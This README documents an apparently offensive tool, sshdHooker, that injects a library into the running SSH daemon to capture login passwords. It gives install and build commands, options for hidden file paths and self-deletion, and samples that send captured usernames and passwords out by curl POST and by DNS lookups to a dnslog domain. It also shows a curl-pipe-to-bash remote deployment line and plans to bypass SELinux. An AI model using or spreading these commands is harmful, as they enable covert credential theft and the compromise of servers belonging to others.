# what's this?

SSHD injector, and then you can record passwords or do other operations.

Need to close selinux

English | [中文文档](readme_cn.md)

# how to use

## auto installer
anto installer，Only temporarily supports x64

Run:
```
bash install.sh
```

Login with ssh password after running，The password record address is /tmp/.password.txt. default evil so path is /tmp/hello.so，default injector path is/tmp/.i


Other parameters:
```
    -e   custom so file path，default is /tmp/hello.so
    -o   custom injector path，default is /tmp/.i.
    -m   change mode,defulat is 0, mode is 0 is to output to the file，output path is /tmp/.password.txt ，mode is 1 is to command execution mode
    -p   change payload，defsult is /tmp/.password.txt,if mode is 1，then use snsprintf to format the command and execute,Make sure the command contains both %s for format username and password
    -d   anto delete,If the value is anyone, any password is captured and deleted.Otherwise, it will be deleted after matching the entered username.
    -l   Specify the libc path. The default addressing is to find libc-xxxx.so and libc.so.x, but it does not rule out that there will be other strange libc names, so the manual specification function is added. For details, please check /proc/pid Find the libc name in /maps
```
## samples

https send password
```
bash install.sh -p "curl -X POST -d 'username=%s\&password=%s' http://127.0.0.1" -m 1
```

dns send password and self-delete
```
bash install.sh -p 'ping `echo %s-%s|xxd -ps`.k9lovy.dnslog.cn -c 1' -m 1 -d anyone
```

Fast remote automatic deployment and self-delete for If any user login succeeds
```
curl -L https://github.com/9bie/sshdHooker/releases/download/1.0.2/sshdHooker.sh | bash -s -- -d anyone
```

## debug

use
```

gcc -shared inject_got.c -ldl -fPIC -o test2.so -std=c99

mv test2.so /tmp/hello.so

gcc sshdHooker.c shellcode.s -g -o inject -ldl -lpthread

sudo ./inject sshd_pid
```


# todo

 - add x86/arm support
 - bypass SELINUX